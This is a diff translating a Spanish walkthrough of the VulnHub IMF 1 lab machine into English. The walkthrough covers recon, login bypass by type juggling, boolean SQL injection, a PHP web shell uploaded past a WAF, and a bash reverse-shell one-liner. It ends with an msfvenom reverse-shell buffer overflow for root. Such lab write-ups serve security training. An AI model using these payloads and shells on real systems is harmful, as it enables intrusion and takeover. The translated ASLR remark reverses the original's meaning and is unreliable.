@@ -1,43 +1,42 @@
-
 ---
 aliases: []
 tags:
-    - writeup
-    - maquina
-    - vulnhub
-    - linux
-    - type-juggling
-    - sqli
-    - file-upload
-    - rce
-    - reverse-shell
-    - buffer-overflow
-maquina: IMF 1
-plataforma: Linux
-dificultad: null
-fecha_resolucion: null
-tecnicas_clave:
-    - Type juggling
-    - Boolean-based SQL injection
-    - File upload to RCE
-    - Buffer overflow
+  - writeup
+  - machine
+  - vulnhub
+  - linux
+  - type-juggling
+  - sqli
+  - file-upload
+  - rce
+  - reverse-shell
+  - buffer-overflow
+machine: IMF 1
+platform: Linux
+difficulty: Beginner/Medium
+date_solved: 2026-09-18
+key_techniques:
+  - Type juggling
+  - Boolean-based SQL injection
+  - File upload to RCE
+  - Buffer overflow
 cve: []
-vector_inicial: IMF administrator web application
-escalada_privilegios: Buffer overflow in the root-owned agent service
-autor: null
+initial_vector: IMF administrator web application
+privilege_escalation: Buffer overflow in the root-owned agent service
+author: null
 writeup_url: https://www.vulnhub.com/entry/imf-1,162/
 ---
 
-- **Máquina IMF 1**: [https://www.vulnhub.com/entry/imf-1,162/](https://www.vulnhub.com/entry/imf-1,162/)
+- **IMF 1 machine**: [https://www.vulnhub.com/entry/imf-1,162/](https://www.vulnhub.com/entry/imf-1,162/)
 
 
-# Primera máquina:
-## Reconocimiento:
+# First machine
+## Reconnaissance
 
 ### Arp-scan
-(Es decir, `arp-scan` busca **primero** en el directorio de trabajo actual, y solo si obtiene `ENOENT` (archivo no existe) hace _fallback_ a la ruta absoluta. El problema es que si obtiene `EACCES` (Permission denied) **no hace el fallback** y se queda con el warning.)
+(That is, `arp-scan` looks **first** in the current working directory, and only falls back to the absolute path if it gets `ENOENT` (file not found). The problem is that if it gets `EACCES` (Permission denied) it **does not fall back** and just keeps the warning.)
 
-Escaneamos la tarjeta de red para ver cual es la ip de la máquina:
+We scan the network interface to find the machine's IP:
 ```bash 
 arp-scan -I ens33 --localnet
 ```
@@ -46,85 +45,85 @@ arp-scan -I ens33 --localnet
 ping -c 1 192.168.1.146
 ```
 
-*(si responde poderiamos usar la herramienta ''whichSystem.py'')*
+*(if it replies we could use the ''whichSystem.py'' tool)*
 ### Nmap
 
-Ejecutamos el comando como administrador.
-Descubrimos los puertos abiertos.
+We run the command as administrator.
+This reveals the open ports.
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.146 -oG allPorts
 ```
 
-Una vez descubiertos los puertos, ejecutamos una serie de scripts sobre los puertos.
-*(En este caso, solo estaba disponible el puerto 80)*
+Once the ports are found, we run a set of scripts against them.
+*(In this case only port 80 was available)*
 ```bash
 nmap -sC -sV -p80 192.168.1.146 -oN Targgeted
 ```
 
-Con *ctrl + shift + t* abrimos otro espacio de trabajo mientras realizamos el scaneo. y con *ctrl + shift + alt + t* nombramos escaneo y reconocimiento, *ctrl + shift + w* para cerrar solo el espacio de trabajo actual.
+With *ctrl + shift + t* we open another workspace while the scan runs; with *ctrl + shift + alt + t* we name it "scan and recon", and *ctrl + shift + w* closes only the current workspace.
 
 ```bash
 nmap --script http-enum -p80 192.168.1.146 -oN webScan
 ```
-Este script actua como un fuzzer
+This script behaves like a fuzzer.
 ### Whatweb
-Ejecutamos el comando whatweb para ver que esta empleando la máquina.
+We run the whatweb command to see what the machine is running.
 ```bash
 whatweb http://192.168.1.146 -v
 ```
 
-Deberian salir versiones desactualizadas o propensas a ataques. Hay que documentarlo.
+Outdated or attack-prone versions should show up. Make sure to document them.
 
-### Página web
-Abrimos la página y vemos klk, gracias al nmap del puerto 80 tenemos la version de Apache y podemos sacar la de Ubuntu en este caso. Cuando ganemos acceso a la máquina, podemos hacer un: *lsb_release -a* para confirmar la versión de ubuntu.
+### Website
+We open the site and take a look; thanks to the nmap of port 80 we have the Apache version and can infer the Ubuntu one. Once we get access to the machine we can run *lsb_release -a* to confirm the Ubuntu version.
 
-Cojemos toda la información que encontremos, apuntando usuarios y email junto con otras informaciones de valor en un archivo data.
+We collect everything we find, noting usernames and emails along with other valuable info in a data file.
 
-Miramos el codigo fuente. *ctrl + u* , encontramos algo que puede ser código en base 64 y para cogerlo desde la web hacemos: 
+We check the source code with *ctrl + u* and find something that looks like base64; to grab it from the site we run:
 ```bash
 curl -s -X GET "http://192.168.1.146/index.php" | grep '\.js' | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' ' | base64 -d; echo
 ```
-y asi conseguimos la primera flag, flag2 que acaba indicandonos un directorio.
+and that gets us the first flag, flag2, which points us to a directory.
 "imfadministrator"
 #### http://192.168.1.146/imfadministrator/
-Una vez dentro de imfadministrator tenemos una via potencial de listado de usuarios validos, probando los nombres de usuario del apartado de contacto.
+Once inside imfadministrator we have a potential way to enumerate valid users by trying the usernames from the contact section.
 
-Probamos tecnicas de sql y demás para ver si vemos algo interesante.
-Encontramos a base de probar el OWASP top 10 el type juggling con burpsuite
+We try SQL and other techniques to see if anything interesting turns up.
+Working through the OWASP Top 10 we find type juggling using Burp Suite.
 
-### Burpsuite y Type Juggling
-Para abrir burpsuite idependiente de una terminal usamos el comando: 
+### Burp Suite and Type Juggling
+To launch Burp Suite independently of a terminal we use the command:
 ```bash
 burpsuite &> /dev/null & disown
 ```
-es importante tambien activar el proxy en el navegador.
+it's also important to enable the proxy in the browser.
 
-Le hacemos una petición de login a la web en el directorio que encontramos (/imfadministrator ) con uno de los usuarios que encontramos en */contact.php* y como contraseña cualquiera. 
+We send a login request to the directory we found (/imfadministrator) with one of the users from */contact.php* and any password.
 
-Le mandamos la petición a burpsuite, y en el campo de pass le aplicamos un type juggling con un [], nos da acceso y si con *ctrl + shift + c* inspeccionamos la página web podemos ver la cookie de sesión válida.
+We send the request to Burp Suite and apply type juggling to the password field with a [], which grants access; inspecting the page with *ctrl + shift + c* we can read the valid session cookie.
 
-### Inyección Boolean
+### Boolean-based injection
 
-Descubrimos que en la Url, si hacemos una comparación la respuesta de la página web cambia
+We discover that if we add a comparison to the URL, the page's response changes:
 ```
 	http://192.168.18.225/imfadministrator/cms.php?pagename=home'or'1'='1
 ```
 
-Para descubrir el nombre de la base de datos actualmente en uso, en vez de igualar a uno como en el ejemplo anterior, podemos igualar caractéres. 
+To find the name of the database currently in use, instead of comparing to one as above, we can compare characters.
 ```
 	http://192.168.18.225/imfadministrator/cms.php?pagename=home' or substring(database(),1,1)='a
 ```
 
-En vez de database, podriamos jugar con tablas, columnas e incluso dumpear los valores de las tablas.
+Instead of database() we could play with tables, columns and even dump the table values.
 
-Nos ayudamos de burpsuite para coger la cookie de sessión y arrastrarla en nuestro script.
+We use Burp Suite to grab the session cookie and carry it into our script.
 ```
 Cookie: PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6
 ```
 
-### Script en pyton
+### Python script
 
-Nos dirigimos al directorio de la máquina: *~/Escritorio/IMF* y creamos con nvim el *sqli.py*.
+We go to the machine's directory *~/Desktop/IMF* and create *sqli.py* with nvim.
 ```python
 #!/usr/bin/python3
 
@@ -179,7 +178,7 @@ if __name__=='__main__':
 
 ```
 
-Después de esto, hacemos unos pequeños cambios para enumerar las tablas y columnas encontramos en la tabla pagename la columna pages con */tutorials-incomplete*
+After this, with a few small changes to enumerate tables and columns, we find in the pagename table the pages column with */tutorials-incomplete*.
 
 ```python
 #!/usr/python3
@@ -235,15 +234,15 @@ if __name__=='__main__':
 
 ```
 
-En */tutorials-incomplete* encontramos un código QR, que con un QR online decoder y flameshot nos da la *flag4{dXBsb2Fkcjk0Mi5waHA=}*  que si resolvemos el base64 nos da *uploadr942.php*. Se trata se un recurso de subida de archivos que existe en */imfadministrator/uploadr942.php*, como la web permite subida de archivos php, probamos a crear un *cmd.php*.
+In */tutorials-incomplete* we find a QR code, which with an online QR decoder and Flameshot gives us *flag4{dXBsb2Fkcjk0Mi5waHA=}*; decoding the base64 yields *uploadr942.php*. It is a file-upload resource at */imfadministrator/uploadr942.php*, and since the site allows PHP uploads we try creating a *cmd.php*.
 ```php
 <?php
 	system($_GET['cmd']);
  ?>
 ```
 
-Sin embargo la página web nos devuelve un *"Invalid file type"*, probamos a cambiar los magic numbers añadiendo un GIF8; al inicio del script. Nada cambia asi que abrimos el burpsuite e inteceptamos la subida, cambiando el tipo de archivo de un cmd.php a un *image/jpg* por ejemplo. 
-La extensión *.jpg* le gusta pero nos salta el CrappyWAF por la palabra *system* usada en el script. Para burlar el WAF lo que hacemos es igualar system a una variable como *$c* por ejemplo y luego con un *echo* lo aplicamos a nivel de sistema. Pero en este caso tambien podemos unicamente poner la palabra en hexadecimal.
+However the site returns *"Invalid file type"*, so we try changing the magic numbers by adding GIF8; at the start of the script. Nothing changes, so we open Burp Suite and intercept the upload, changing the file type from cmd.php to *image/jpg* for example.
+It accepts the *.jpg* extension but the CrappyWAF triggers on the word *system* used in the script. To bypass the WAF we assign system to a variable such as *$c* and then apply it at the system level with an *echo*. In this case, though, we can simply write the word in hexadecimal.
 ```php
 GIF8;
 <?php
@@ -252,20 +251,20 @@ GIF8;
 ?>
 ```
 
-Una vez subido el archivo, si vemos el código fuente de la página podemos ver un identificador debajo de *File successfully uploaded*. Con este identificador y añadiendo *.gif* en este caso podemos acceder a http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif que es donde se estan subiendo los archivos y se interpreta nuestro código php.
+Once the file is uploaded, in the page source we can see an identifier below *File successfully uploaded*. With that identifier plus *.gif* we can reach http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif, which is where the files are uploaded and our PHP code gets executed.
 
-### Reverse Shell
-Como tenemos una forma potencial de ejecutar comandos, nos ponemos en escucha por el puerto 443 con netcat
+### Reverse shell
+Since we have a potential way to run commands, we start a listener on port 443 with netcat.
 ```bash
 nc -nlvp 443
 ```
 
-Y en la url ponemos el one liner con url encode para el *&* y con nuestra ip
+And in the URL we place the one-liner, URL-encoding the *&* and using our IP.
 ```shell
 http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.226/443 0>%261"
 ```
 
-Una vez ganamos acceso aplicamos un tratamiento de la tty para que se vea bonito. (Cada linea es un comado separado)
+Once we have access we upgrade the TTY so it looks nice. (Each line is a separate command.)
 ```shell
 script /dev/null -c bash
 #ctrl+z
@@ -276,29 +275,29 @@ export SHELL=bash
 stty rows 44 columns 184
 ```
 
-Una vez tenemos la todo funcionando, podemos hacer un *ls* y encontrar la flag5 *agentservices* 
+Once everything works, we can run *ls* and find flag5 *agentservices*.
 
-### Escalada de privilegios
+### Privilege escalation
 
-Como la flag5 era agentservices, buscamos desde la raiz archivos que contengan la palabra agent.
+Since flag5 was agentservices, we search from the root for files containing the word agent.
 ```bash
 cd / 
 find / -name agent 2>/dev/null
 ```
 
-Encontramos un */etc/xinetd.d/agent* que es un servicion que esta corriendo en el puerto 7788, donde el propietario es root. Pero es un binario normal, no tiene SUID ni ninguna capability. Nos conectamos al puerto en segundo plano y podemos ver como el servicio se activa.
+We find */etc/xinetd.d/agent*, a service running on port 7788 owned by root. It's a plain binary, though — no SUID and no capabilities. We connect to the port in the background and can watch the service start.
 ```bash
 nc localhost 7788 &>/dev/null &
 ps -faux | grep agent
 ```
 
-Cuando nos conectamos nos pide el *Agent ID*, que no lo sabemos, pero si usamos strings para tratar de listar las cadenas de caracteres imprimibles de este binario encontremos algo.
+When we connect it asks for the *Agent ID*, which we don't know, but if we use strings to list the printable strings of the binary we find something.
 ```bash
 strings /usr/local/bin/agent
 ```
 
-### Buffer Overflow
-Como de primeras no se ve nada, vamos a analizar el binario con **GHIDRA**, nos pasamos el binario de la máquina víctima a la atacante.
+### Buffer overflow
+Since nothing obvious shows up at first, we analyze the binary with **GHIDRA**, transferring it from the victim to the attacker machine.
 ```bash
 #maquina atacante
 nc -nlvp 443 > agent
@@ -306,43 +305,43 @@ nc -nlvp 443 > agent
 nc 192.168.18.226 < /usr/local/bin/agent
 ```
 
-Lo abrimos con ghidra y vamos a function y main. Alli debajo de Agent ID: podemos encontrar un *fgets* de *local 22*, que parece ser el input del usuario, asi que con *l* sustituimos local 22 por *userinput*. Un poco mas abajo podemos ver que el programa hace un *strncmp*(una comparación) del *userinput* y un *local28*. Con lo cual encontramos un poco mas arriba el *asprintf* de local28 que le esta cargando un número en hexadecimal (0x2ddd984) que si lo pasamos a decimal nos da **48093572** que es el Agent ID.
+We open it in Ghidra and go to the function and main. Below "Agent ID:" we find an *fgets* into *local 22*, which looks like the user input, so with *l* we rename local 22 to *userinput*. A bit below, the program does a *strncmp* (a comparison) between *userinput* and *local28*. Slightly above we find the *asprintf* for local28 loading a hexadecimal number (0x2ddd984) which, converted to decimal, gives **48093572** — the Agent ID.
 
-![[Pasted image 20260917132456.png]]
+![[Pasted image 20260917132456.png|Agent menu reached with Agent ID 48093572]]
 
-Con el cual podemos acceder al menú con 3 opciones, pero la interesante es la tercera, en la que con Ghidra podemos ver que la función report tiene un *char local_a8* con un tamaño de buffer de [164] y ademas utiliza un *gets(local_a8)* para cargarla, que es una función vulnerable donde si yo meto muchos mas caracteres que 164 se va a acontecer un buffer overflow.
+That lets us reach a menu with 3 options; the interesting one is the third, where Ghidra shows that the report function has a *char local_a8* with a buffer size of [164] and uses *gets(local_a8)* to fill it — a vulnerable function where, if I enter many more than 164 characters, a buffer overflow occurs.
 
-Para el buffer overflow vamos a utilizar peda, asi que abrimos el gdb ejecutando el agent. 
+For the buffer overflow we'll use peda, so we open gdb running the agent.
 ```bash
 gdb ./agent -q              
 ```
 
-(si no funciona, puede ser porque el agent no tiene permisos, *chmod +x agent* o tambien porque el agent es un programa en 32bits y mi ordenador es de 64, asi que hay que instalar y actualizar algunas librerias.)
+(if it doesn't work, it may be because the agent lacks permissions — *chmod +x agent* — or because the agent is a 32-bit program and my machine is 64-bit, so some libraries need installing and updating.)
 ```bash
 sudo pacman -Sy
 sudo pacman -S lib32-glibc lib32-gcc-libs
 ```
 
-Con el gdb y pasandole unas 200 "A" por ejemplo podemos ver que en el EIP se esta aconteciendo un buffer overflow. Así que vamos a tratar de calcular cual es el total de caracteres que tenemos que introducir hasta antes de sobrescribir el EIP. Dentro de gdb utilizamos los siguientes comandos. (Como PETA no estaba funcionando, me he descargado pwndbg).
+With gdb, feeding it about 200 "A"s for example, we can see a buffer overflow reaching EIP. So we try to work out the total number of characters to send just before overwriting EIP. Inside gdb we use the following commands. (Since PEDA wasn't working, I installed pwndbg.)
 
 ```pwndbg
 cyclic 200
 r
 ```
 
-Pegamos las 200 lineas en el 3_report update y luego para saber el tamaño del offset ejecutamos.
+We paste the 200 characters into the 3_report update and then run the following to find the offset size:
 ```pwndbg
 cyclic -l $eip
 ```
 
-Nos da un total de 168, asi que con el comando *checksec* revisamos las protecciones. Como el aslr esta deshabilitado, no podemos poner que le eip apunte a una dirección fija, porque esta cambiará en la próxima ejecución. Pero la direcciones contenidas en le binario, son estáticas.  Asi que buscamos cual es la dirección de eax para hacer un script en python.
+It gives a total of 168, so with *checksec* we review the protections. With ASLR enabled we can't point EIP at a fixed address because it will change on the next run, but the addresses inside the binary are static. So we look for the address of eax to build a Python script.
 
-Creamos la instrucción con *msfvenom*
+We create the payload with *msfvenom*.
 ```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.18.226 LPORT=443 -b '\x00\x0a\0xd' -f c
 ```
 
-Con lo que no crea, podemos hacer un script en python.
+With what it generates, we can build a Python script.
 ```python
 #!/usr/bin/python3 
 from struct import pack
@@ -369,5 +368,5 @@ s.recv(1024)
 s.send(payload)
 ```
 
-Nos ponemos en escucha, con la máquina atacante, por el puerto especificado en el msfvenom y al ejecutar el script en la máquina víctima, si todo ha salido bien, deberiamos terner una shell en root. Para el tratamiento de la tty vale con un simple *script /dev/null -c bash* y accedemos al directorio de root para la última flag.
-![[Pasted image 20260918142622.png]]
+We start a listener on the attacker machine on the port specified in msfvenom, and running the script against the victim should, if all went well, give us a root shell. A simple *script /dev/null -c bash* is enough to upgrade the TTY, and we go to root's directory for the last flag.
+![[Pasted image 20260918142622.png|Root shell and final flag]]
